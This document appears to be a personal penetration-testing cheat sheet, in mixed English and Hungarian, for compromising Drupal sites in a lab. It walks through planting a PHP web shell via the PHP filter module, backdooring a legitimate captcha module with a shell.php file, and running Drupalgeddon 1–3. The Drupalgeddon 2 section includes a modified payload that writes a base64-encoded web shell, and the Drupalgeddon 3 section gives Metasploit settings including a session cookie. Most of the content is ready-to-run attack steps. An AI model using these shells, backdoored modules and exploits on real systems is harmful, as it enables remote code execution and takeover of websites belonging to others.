# drupal
## scanning
sudo pip3 install droopescan  
droopescan scan drupal -u http://10.10.10.1/  
## exploiting
nehezebb tema mint a wordpress vagy joomla eseteben
### leveraging the php filter module
#### new versions than 8 need the installation of the module as well (before version 8 it has to be skipped)
* wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
* nem kell kicsomagolni
* login as admin
* go to Administration / Reports / Available updates (maybe under the Extend menu instead)
* 'Upload a module or theme archive to install'
* talozzuk ki a letoltott archive file-t
* install
* !!!!!! extra info !!!!!!
  * lehetseges, hogy kulon az extension-nel be kell pipalni az update managert hogy az is hozza legyen adva !!!
  * php filter-t is ki kell lehet pipalni
#### older Drupal versions contains the module by default - before 8
* login as admin
* 1
  * choose modules
  * enable 'php filter'
  * save configuration (lent)
* 2
  * go to Content / Add content
  * create basic page
  * insert web shell script like: <?php system($_GET['cmd']); ?>
  * text format -> php code
  * save
* 3
  * we will be redirected to the new page like: http://10.10.10.1/node/3
  * append web shell param, and call it
    * curl -s http://10.10.10.1/node/3?cmd=id
### uploading a backdoored module
* login as admin (or some similar high priv user) (dont know which can be fine....)
* download a standard module from official repo
* e.g.
  * wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
* tar xvf captcha-8.x-1.2.tar.gz
* create new file with web shell content like shell.php: <?php system($_GET['cmd']); ?>
* create a .htaccess file with below content
<pre>
 <IfModule mode_rewrite.c>
  RewriteEngine On
  RewriteBase /
 </IfModule>
</pre>
* mov these two files (shell.php, .htaccess) into the module folder and zip it back
  * mv shell.php .htaccess captcha
  * tar cvf captcha.tar.gz captcha/
* click 'Manage' / 'Extend' / + Install new module
* you are on the install page, like:   http://10.10.10.1/admin/modules/install
* browse local archive file, click Install
* run rce
  * curl -s http://10.10.10.1/modules/captcha/shell.php?cmd=id
### Known vulnerabilities (Drupalgeddon 1 - 3)
#### info
##### Drupalgeddon 1
CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
##### Drupalgeddon 2
CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
##### Drupalgeddon 3
CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
#### exploitation
##### Drupalgeddon 1 (Drupal 7.0 - 7.31)
###### manual
https://www.exploit-db.com/exploits/34992  
python2.7 drupalgeddon.py -t http://10.10.10.1/ -u peter -p pass123  
###### metasploit
msf> exploit/multi/http/drupal_drupageddon/  
##### Drupalgeddon 2 (Drupal 7.58 - 8.5.1)
https://www.exploit-db.com/exploits/44448  
python3 drupalgeddon.py  
feltolt egy hello.txt fajlt egy kacsinto smileyval  
szerkesszuk at a scriptet a 'payload'-os sornal  
irjuk bele base64 encode-olva a web shell-t ami utana decode-olunk  
fontos hogy a kiterjesztes php legyen  
pl igy...  
<pre>
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K" | base64 -d | tee hello.php'}
</pre>
aztan curl
curl -s http://10.10.10.1/hello.php?cmd=id
##### Drupalgeddon 3 (multiple versions)
It requires a user to have the ability to delete a node.  
We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.  
###### metasploit
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195  
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local  
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1  
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15  
msf6 exploit(multi/http/drupal_drupageddon3) > run  
